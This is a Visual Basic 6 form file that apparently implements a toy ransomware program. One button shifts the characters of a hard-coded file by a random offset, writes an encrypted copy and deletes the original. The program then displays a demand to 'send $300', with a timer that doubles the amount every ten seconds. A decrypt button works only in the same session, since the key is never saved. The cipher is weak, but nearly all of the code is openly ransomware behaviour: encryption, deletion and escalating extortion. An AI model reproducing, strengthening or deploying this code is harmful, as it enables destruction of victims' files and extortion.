VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   5052
   ClientLeft      =   120
   ClientTop       =   456
   ClientWidth     =   9828
   LinkTopic       =   "Form1"
   ScaleHeight     =   5052
   ScaleWidth      =   9828
   StartUpPosition =   3  '系統預設值
   Begin VB.CommandButton Command2 
      Caption         =   "SMILE"
      Height          =   1692
      Left            =   6240
      TabIndex        =   6
      Top             =   2760
      Width           =   1932
   End
   Begin VB.CommandButton Command1 
      Caption         =   "CRY"
      Height          =   1692
      Left            =   840
      TabIndex        =   5
      Top             =   2760
      Width           =   1932
   End
   Begin VB.Timer Timer1 
      Left            =   9240
      Top             =   2400
   End
   Begin VB.Label Label6 
      Caption         =   "NEW: 每次開啟時選擇一個1~10的隨機位移量。這意味著必須要在同一次開啟時將檔案解密。"
      BeginProperty Font 
         Name            =   "新細明體"
         Size            =   9
         Charset         =   136
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   492
      Left            =   2880
      TabIndex        =   7
      Top             =   4560
      Width           =   3732
   End
   Begin VB.Label Label5 
      Caption         =   "贖款"
      Height          =   615
      Left            =   3120
      TabIndex        =   4
      Top             =   3720
      Width           =   975
   End
   Begin VB.Label Label4 
      Caption         =   "時間"
      Height          =   615
      Left            =   3120
      TabIndex        =   3
      Top             =   2880
      Width           =   975
   End
   Begin VB.Label Label3 
      Caption         =   "0"
      Height          =   615
      Left            =   4440
      TabIndex        =   2
      Top             =   3720
      Width           =   1335
   End
   Begin VB.Label Label2 
      Caption         =   "0"
      Height          =   615
      Left            =   4440
      TabIndex        =   1
      Top             =   2880
      Width           =   1335
   End
   Begin VB.Label Label1 
      Caption         =   "Oooops,your files have been encrypted!! send $300 to aaaa-bbbb-cccc-dddd"
      BeginProperty Font 
         Name            =   "新細明體"
         Size            =   27.6
         Charset         =   136
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   1695
      Left            =   480
      TabIndex        =   0
      Top             =   600
      Width           =   9015
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim a As Integer
Private Sub Command1_Click()
    Open "d:\a.txt" For Input As #1
    Open "d:\a.cry.txt" For Output As #2
    Do While Not EOF(1)
        Input #1, x
        y = ""
        For i = 1 To Len(x)
            y = y & Chr(Asc(Mid(x, i, 1)) + a)
        Next
        Print #2, y
    Loop
    Close #1
    Close #2
    Kill ("d:\a.txt")
    Timer1.Interval = 1000
    Label3.Caption = 300
End Sub

Private Sub Command2_Click()
    Open "d:\a.cry.txt" For Input As #1
    Open "d:\a.txt" For Output As #2
    Do While Not EOF(1)
        Input #1, x
        y = ""
        For i = 1 To Len(x)
            y = y & Chr(Asc(Mid(x, i, 1)) - a)
        Next
        Print #2, y
    Loop
    Close #1
    Close #2
End Sub

Private Sub Form_Load()
    Randomize
    a = Int(Rnd() * 10) + 1
End Sub

Private Sub Timer1_Timer()
    Label2.Caption = Label2.Caption + 1
    If Label2.Caption Mod 10 = 0 Then
        Label3.Caption = Label3.Caption * 2
    End If
End Sub
